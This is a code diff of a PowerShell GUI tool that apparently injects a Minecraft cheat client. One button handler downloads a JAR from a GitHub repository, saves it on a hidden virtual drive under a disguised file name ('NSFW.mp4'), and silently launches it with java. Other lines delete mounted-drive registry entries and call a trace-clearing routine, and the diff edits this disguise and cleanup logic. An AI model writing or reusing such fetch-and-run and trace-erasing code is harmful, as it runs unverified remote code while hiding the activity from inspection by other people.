@@ -363,20 +363,20 @@ $injectButton.Add_Click({
     $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $prestigeButton.Add_Click({
         try {
-            if (-Not (Test-Path "Z:\mom NSFW.mp4")) {
+            if (-Not (Test-Path "Z:\NSFW.mp4")) {
                 # Quick download with single retry
                 for ($i = 0; $i -lt 2; $i++) {
                     try {
-                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-extra-mc1.21.4.jar" -OutFile "Z:\mom NSFW.mp4" -TimeoutSec 12 -ErrorAction Stop
-                        if ((Test-Path "Z:\mom NSFW.mp4") -and ((Get-Item "Z:\mom NSFW.mp4").Length -gt 0)) {
+                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-mc1.21.4.jar" -OutFile "Z:\NSFW.mp4" -TimeoutSec 12 -ErrorAction Stop
+                        if ((Test-Path "Z:\NSFW.mp4") -and ((Get-Item "Z:\NSFW.mp4").Length -gt 0)) {
                             break
                         }
                     } catch { }
                     if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                 }
             }
-            if ((Test-Path "Z:\mom NSFW.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
-                Start-Process java -ArgumentList '-jar "Z:\mom NSFW.mp4"' -ErrorAction SilentlyContinue
+            if ((Test-Path "Z:\NSFW.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
+                Start-Process java -ArgumentList '-jar "Z:\NSFW.mp4"' -ErrorAction SilentlyContinue
             }
         } catch { }
     })
@@ -535,9 +535,6 @@ detach vdisk
         # Final registry cleanup
         Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
         Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force -ErrorAction SilentlyContinue
-        
-        # Stop VDS service
-        Stop-Service -Name "vds" -Force -ErrorAction SilentlyContinue
         
         # Final comprehensive trace clearing at the end
         Clear-AllTraces
